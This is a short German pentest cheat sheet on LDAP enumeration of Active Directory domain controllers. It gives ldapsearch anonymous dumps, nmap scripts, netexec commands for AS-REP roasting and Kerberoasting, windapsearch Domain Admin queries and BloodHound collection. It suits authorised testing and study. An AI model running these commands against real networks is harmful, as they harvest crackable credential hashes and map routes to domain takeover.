# 📇 LDAP (389/636)

> Wenn LDAP offen ist, ist es meistens ein Domain Controller. Massiv viele AD-Infos abrufbar.

## Anonymous Bind

```bash
# Naming Contexts (Basis-DN finden)
ldapsearch -x -H ldap://$RHOST -s base namingcontexts

# Alles dumpen
ldapsearch -x -H ldap://$RHOST -b "DC=domain,DC=local"

# Nur User
ldapsearch -x -H ldap://$RHOST -b "DC=domain,DC=local" "(objectClass=user)"

# Nur User-CN + Description (wo oft Passwörter stehen!)
ldapsearch -x -H ldap://$RHOST -b "DC=domain,DC=local" "(objectClass=user)" cn description
```

## nmap NSE

```bash
nmap -p389 --script "ldap-*" $RHOST
nmap -p389 --script ldap-rootdse $RHOST
nmap -p389 --script ldap-search $RHOST
```

## Mit Creds (besser)

```bash
# nxc / netexec
nxc ldap $RHOST -u user -p pass
nxc ldap $RHOST -u user -p pass --users
nxc ldap $RHOST -u user -p pass --groups
nxc ldap $RHOST -u user -p pass --asreproast asrep.txt
nxc ldap $RHOST -u user -p pass --kerberoasting kerb.txt
nxc ldap $RHOST -u user -p pass --trusted-for-delegation

# windapsearch
windapsearch -d domain.local -u user -p pass --dc-ip $RHOST -U      # Users
windapsearch -d domain.local -u user -p pass --dc-ip $RHOST -G      # Groups
windapsearch -d domain.local -u user -p pass --dc-ip $RHOST --da    # Domain Admins
```

## BloodHound (für komplexe AD-Pfade)

```bash
# Daten sammeln (Linux)
bloodhound-python -d domain.local -u user -p pass -ns $RHOST -c All

# Dann in BloodHound importieren:
bloodhound &
neo4j console &
# → ZIP-Files in BloodHound-GUI ziehen
```

→ Vorgefertigte Queries: "Shortest Path to Domain Admins", "Kerberoastable Users", etc.
